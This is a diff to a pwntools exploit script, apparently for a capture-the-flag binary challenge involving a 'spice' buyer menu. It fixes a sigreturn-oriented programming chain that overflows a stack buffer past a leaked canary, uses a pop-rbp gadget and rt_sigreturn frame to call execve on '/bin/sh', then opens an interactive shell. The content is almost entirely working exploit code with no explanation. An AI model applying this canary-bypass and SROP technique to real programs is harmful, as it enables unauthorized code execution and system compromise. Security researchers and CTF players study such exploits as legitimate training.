@@ -38,14 +38,16 @@ print("Leaked canary:", hex(canary))
 
 # Prepare the sigreturn frame
 binsh = stack + 4
-syscall = 0x00401274  # addr of syscall instruction (in prompt)
+syscall = 0x401274  # addr of syscall instruction (in prompt)
 frame = SigreturnFrame()
 frame.rax = int(constants.SYS_execve)
 frame.rdi = binsh
 frame.rsi = 0
 frame.rdx = 0
 frame.rsp = 0
-frame.rip = syscall
+frame.rip = syscall-3
+
+pop_rbp = 0x4011cd
 
 # Make a ROP chain
 offset = 0xd4
@@ -54,14 +56,18 @@ payload = b"/bin/sh\x00".ljust(offset, b'A')
 payload += p64(canary)
 payload += p64(0)  # saved rbp
 payload += p64(elf.symbols['spice_amount'])
-payload += p64(syscall)
+payload += p64(pop_rbp)
 payload += p64(0x0f)  # spice_amount (placed into rax); 0xf is rt_sigreturn()
-payload += bytes(frame)[8:]
+payload += p64(syscall)
+payload += bytes(frame)
 
 # Do the buffer overflow
 io.sendlineafter(b"> ", b"1")
 io.sendlineafter(b"Enter the buyer index: ", b"0")
 io.sendlineafter(b"How long is the buyer's name? ", numb(10000))
 io.sendlineafter(b"Enter the buyer's name: ", payload)
+
+# Exit
+io.sendlineafter(b"> ", b"5")
 
 io.interactive()
